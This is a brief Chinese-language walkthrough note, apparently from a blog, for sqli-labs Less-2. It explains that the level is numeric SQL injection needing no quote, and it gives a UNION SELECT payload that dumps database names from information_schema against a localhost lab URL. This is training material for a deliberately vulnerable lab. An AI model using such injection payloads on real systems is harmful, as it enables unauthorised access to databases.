和less1一样只是这个属于数值型注入，不需要加单引号“ ‘ ”

爆库语句：

127.0.0.1/sql-labs/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/68D119FB32154BC39322F61D9588D0B5clipboard.png)

